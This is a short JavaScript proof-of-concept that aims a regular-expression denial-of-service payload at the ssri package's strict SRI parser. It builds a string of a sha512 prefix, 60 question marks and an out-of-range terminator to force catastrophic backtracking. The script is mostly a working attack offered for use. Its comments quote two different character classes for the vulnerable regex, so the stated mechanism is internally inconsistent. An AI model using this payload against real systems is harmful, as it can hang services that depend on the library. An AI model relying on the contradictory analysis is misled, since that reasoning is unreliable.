async function exploit() {
   const ssri = require('ssri');

   // The STRICT_SRI_REGEX constant is defined as:
   // /^([a-z0-9]+)-([A-Za-z0-9+/=]{44,88})(\?[a-zA-Z0-9+/=]*)*$/
   // The critical vulnerable fragment is (\?[\x21-\x7E]*)*$
   // 
   // Explanation of the RedoS mechanism:
   // 1. The character '?' (0x3F) falls strictly within the allowed visible ANSI 
   //    character class [\x21-\x7E].
   // 2. This creates a catastrophic ambiguity in the repeated group (\?...)*:
   //    Every '?' found in the input can either serve as the literal start of a 
   //    new option group (\?) OR be consumed as content by the trailing * of the 
   //    preceding group.
   // 3. For a string containing N question marks, this results in an exponential 
   //    number of valid partitions (~2^N) that the regex engine must explore to 
   //    determine if a match exists.
   // 4. By appending a terminator character outside the allowed range (0xA0 is 160, 
   //    which exceeds the max 0x7E), we ensure the overall match must fail at the $.
   // 5. Because the engine cannot short-circuit early due to ambiguity, it exhausts 
   //    all partitions during backtracking before reporting failure. This triggers 
   //    the exponential CPU spike (or exceeds the specified backtrack limit).

   const algorithm = 'sha512';
   const digest = 'A'.repeat(44); // Satisfies {44,88} base64 length constraint

   // Increasing repetition to 60 ensures the potential partitions (2^60) vastly 
   // exceed the safety limit of 30,000 backtracks, guaranteeing the vulnerability
   // is triggered in environments without hard limits.
   const maliciousOptions = '?'.repeat(60); 

   // Append invalid terminator to force final match failure and backtracking cascade
   const fullPayload = `${algorithm}-${digest}${maliciousOptions}\xA0`;

   console.log('[*] Triggering ReDoS on STRICT_SRI_REGEX...');
   console.log(`[*] Payload length: ${fullPayload.length} bytes`);
   console.log('[*] Note: This payload forces exponential backtracking by exploiting the overlap between literal "?" and class [\x21-\x7E].');

   // `{ strict: true }` forces the `ssri` parser to use STRICT_SRI_REGEX for validation.
   ssri.parse(fullPayload, { strict: true });
}

await exploit();
